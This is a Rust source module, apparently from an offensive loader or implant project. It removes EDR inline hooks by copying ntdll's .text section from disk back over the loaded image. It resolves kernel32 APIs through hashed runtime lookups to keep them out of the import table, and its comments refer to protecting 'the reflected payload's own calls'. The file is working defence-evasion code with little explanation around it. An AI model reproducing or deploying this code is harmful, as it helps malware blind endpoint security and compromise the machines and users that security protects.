//! ntdll `.text` integrity restore (Wave 6: unhook EDR inline hooks).
//!
//! EDRs typically inline-hook ntdll exports: they overwrite the first bytes of
//! a syscall stub with `jmp <edr>` so ANY caller — including logical resolution
//! like [`crate::detect`] — lands on the hook instead of the real NT function.
//! `ntdll![NtQueryInformationProcess]` and the reflected payload's own calls
//! would both be intercepted.
//!
//! This module re-reads `ntdll.dll` from disk and copies the `.text` section
//! back over the loaded image, wiping any prologue patches. Same approach as
//! public unhook tools, but self-contained: every WinAPI below is resolved at
//! runtime from kernel32 exports (no import-table entries), mirroring the
//! wave-2 .. wave-5 IAT-reduction contract.
//!
//! Mapping note: disk `.text` lives at `PointerToRawData` (file offset), the
//! loaded image at `VirtualAddress` (RVA). We copy disk→memory by those
//! independently-resolved offsets.

use std::ffi::c_void;
use std::ptr;

use windows::Win32::Foundation::HANDLE;
use windows::core::PCWSTR;

use crate::resolve::{api, hash_bytes, hash_mod_bytes};

// ── resolved kernel32 APIs (no IAT entries) ──────────────────────────────

type CreateFileW =
    unsafe extern "system" fn(PCWSTR, u32, u32, *const c_void, u32, u32, HANDLE) -> HANDLE;
type GetFileSizeEx = unsafe extern "system" fn(HANDLE, *mut i64) -> i32;
type ReadFile = unsafe extern "system" fn(HANDLE, *mut u8, u32, *mut u32, *const c_void) -> i32;
type VirtualProtect = unsafe extern "system" fn(*const c_void, usize, u32, *mut u32) -> i32;
type CloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

/// Resolve one kernel32 export, panic with the export name on failure.
fn k32(name: &str) -> usize {
    let addr = api(hash_mod_bytes(b"kernel32.dll"), hash_bytes(name.as_bytes()));
    addr.unwrap_or_else(|| panic!("unhook: cannot resolve kernel32!{name}"))
}

// ── constants (raw values, mirroring the `windows` crate) ────────────────
const GENERIC_READ: u32 = 0x8000_0000;
const FILE_SHARE_READ: u32 = 0x1;
const OPEN_EXISTING: u32 = 0x3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const INVALID_HANDLE_VALUE: *mut c_void = -1isize as *mut c_void;

// PE layout offsets (basis shared with resolve.rs).
const PE_SECTION_HEADER_SIZE: usize = 40;

/// `.text` section of the loaded ntdll image:
/// `(rva, file_offset, bytes_to_fix)` — `bytes_to_fix` is min(virtual, raw).
fn text_section(base: usize) -> Option<(usize, usize, usize)> {
    let b = base as *const u8;
    // SAFETY: reading the PE header of a mapped module (loader guarantees
    // validity); all offsets are bounded by the section count from the header.
    unsafe {
        let e_lfanew = ptr::read_unaligned(b.add(0x3c) as *const u32) as usize;
        let nt = b.add(e_lfanew);
        let num_sections = ptr::read_unaligned(nt.add(6) as *const u16) as usize;
        let opt_size = ptr::read_unaligned(nt.add(16) as *const u16) as usize;
        let sections = nt.add(24 + opt_size); // OptionalHeader starts at +24
        for i in 0..num_sections {
            let s = sections.add(i * PE_SECTION_HEADER_SIZE);
            let name = core::slice::from_raw_parts(s, 8);
            if name.starts_with(b".text") {
                let virt_size = ptr::read_unaligned(s.add(8) as *const u32) as usize;
                let rva = ptr::read_unaligned(s.add(12) as *const u32) as usize;
                let raw_size = ptr::read_unaligned(s.add(16) as *const u32) as usize;
                let raw_ptr = ptr::read_unaligned(s.add(20) as *const u32) as usize;
                let size = if virt_size != 0 { virt_size } else { raw_size };
                // Prefer a non-empty raw copy; some packers zero raw_size.
                let fix = if raw_size != 0 {
                    raw_size.min(size)
                } else {
                    size
                };
                return Some((rva, raw_ptr, fix.max(1)));
            }
        }
        None
    }
}

/// Path of the system's ntdll (mirrors where the loader read it from).
fn ntdll_path() -> Option<String> {
    let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
    Some(format!(r"{root}\System32\ntdll.dll"))
}

/// Read the on-disk `ntdll.dll` into a buffer.
fn read_disk_ntdll() -> Option<Vec<u8>> {
    let path = ntdll_path()?;
    let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();

    let create_file_w = unsafe { std::mem::transmute::<usize, CreateFileW>(k32("CreateFileW")) };
    let get_file_size_ex =
        unsafe { std::mem::transmute::<usize, GetFileSizeEx>(k32("GetFileSizeEx")) };
    let read_file = unsafe { std::mem::transmute::<usize, ReadFile>(k32("ReadFile")) };

    // SAFETY: CreateFileW with read-only flags on a NUL-terminated path; the
    // handle is closed on every path out of this fn (guard below).
    let h = unsafe {
        create_file_w(
            PCWSTR(wide.as_ptr()),
            GENERIC_READ,
            FILE_SHARE_READ,
            ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(std::ptr::null_mut()),
        )
    };
    if h.0 == INVALID_HANDLE_VALUE {
        return None;
    }
    let _guard = OwnedHandle(h);

    let mut size = 0i64;
    // SAFETY: GetFileSizeEx writes one i64 on success.
    if unsafe { get_file_size_ex(h, &mut size) } == 0 || size <= 0 {
        return None;
    }
    let mut buf = vec![0u8; size as usize];
    let mut off = 0usize;
    while off < buf.len() {
        let chunk = (buf.len() - off).min(u32::MAX as usize) as u32;
        let mut read = 0u32;
        // SAFETY: buf[off..] is a live slice of the requested length; ReadFile
        // fills exactly `read` bytes and we advance by it.
        if unsafe { read_file(h, buf[off..].as_mut_ptr(), chunk, &mut read, ptr::null()) } == 0 {
            return None;
        }
        if read == 0 {
            break;
        }
        off += read as usize;
    }
    buf.truncate(off);
    Some(buf)
}

/// Bytes in ntdll `.text` that differ from the on-disk copy (0 == clean).
pub fn hooked_bytes() -> Option<usize> {
    let base = crate::resolve::module_base(hash_mod_bytes(b"ntdll.dll"))?;
    let (rva, file_off, size) = text_section(base)?;
    let disk = read_disk_ntdll()?;
    let disk_text = disk.get(file_off..(file_off + size).min(disk.len()))?;
    // SAFETY: ntdll is loaded in every process and `.text` is readable.
    let mem = unsafe { core::slice::from_raw_parts((base + rva) as *const u8, disk_text.len()) };
    Some(mem.iter().zip(disk_text).filter(|(a, b)| a != b).count())
}

/// Restore ntdll `.text` from the on-disk copy; returns bytes rewritten.
pub fn unhook_ntdll() -> Result<usize, &'static str> {
    let base =
        crate::resolve::module_base(hash_mod_bytes(b"ntdll.dll")).ok_or("ntdll not loaded")?;
    let (rva, file_off, size) = text_section(base).ok_or("ntdll .text not found")?;
    let disk = read_disk_ntdll().ok_or("cannot read ntdll from disk")?;
    let disk_text = disk
        .get(file_off..(file_off + size).min(disk.len()))
        .ok_or("disk ntdll truncated")?;

    let target = base + rva;
    let mut old_prot = 0u32;
    let virtual_protect =
        unsafe { std::mem::transmute::<usize, VirtualProtect>(k32("VirtualProtect")) };
    // SAFETY: target is inside the loaded ntdll image (readable+executable);
    // we flip it writable, copy, then restore the original protection.
    unsafe {
        if virtual_protect(
            target as *const c_void,
            disk_text.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_prot,
        ) == 0
        {
            return Err("VirtualProtect(make RW) failed");
        }
        let mem = core::slice::from_raw_parts_mut(target as *mut u8, disk_text.len());
        let changed = mem.iter().zip(disk_text).filter(|(a, b)| a != b).count();
        mem.copy_from_slice(disk_text);
        let _ = virtual_protect(
            target as *const c_void,
            disk_text.len(),
            old_prot,
            &mut old_prot,
        );
        Ok(changed)
    }
}

/// Close a handle on drop.
struct OwnedHandle(HANDLE);
impl Drop for OwnedHandle {
    fn drop(&mut self) {
        // SAFETY: CloseHandle on a handle we own (failure is benign).
        unsafe {
            let close = std::mem::transmute::<usize, CloseHandle>(k32("CloseHandle"));
            let _ = close(self.0);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn text_section_found() {
        if let Some(base) = crate::resolve::module_base(hash_mod_bytes(b"ntdll.dll")) {
            let (rva, file_off, size) = text_section(base).expect("ntdll .text must exist");
            assert!(rva > 0 && file_off > 0 && size > 0);
        }
    }

    #[test]
    fn disk_ntdll_reads() {
        let disk = read_disk_ntdll();
        assert!(disk.is_some(), "System32 ntdll.dll must be readable");
        assert!(!disk.unwrap().is_empty());
    }

    #[test]
    fn hook_scan_is_bounded() {
        // Never traps; 0 or small on a clean box, whatever count on a hooked one.
        let _ = hooked_bytes();
    }
}
